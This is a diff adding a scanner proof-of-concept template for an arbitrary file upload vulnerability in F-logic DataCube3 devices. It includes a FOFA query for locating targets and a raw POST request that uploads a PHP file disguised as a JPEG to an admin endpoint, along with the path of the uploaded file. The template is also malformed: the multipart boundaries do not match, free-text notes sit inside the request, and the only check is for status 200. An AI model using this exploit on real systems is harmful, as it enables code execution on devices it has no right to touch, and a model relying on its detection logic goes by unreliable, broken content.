@@ -1,0 +1,74 @@
+id: poc-cba5uthhph6u9if1
+info:
+  name: F-logic DataCube3 transceiver_schedule.php 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cba5uthhph6u9if1'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cba5uthhph6u9if1
+    fofa: title=="DataCube3"
+http:
+- raw:
+  - 'POST /admin/transceiver_schedule.php?usb_schedule HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+
+    Cache-Control: max-age=0
+
+
+    Connection: keep-alive
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVwMNX77LcRMVGnrB
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+
+
+    -----------------------------113389720123090127612523184396
+
+
+    Content-Disposition: form-data; name="upload_file"; filename="dudesite.php"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    <?php phpinfo();?>
+
+
+    -----------------------------113389720123090127612523184396
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /admin/data/dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
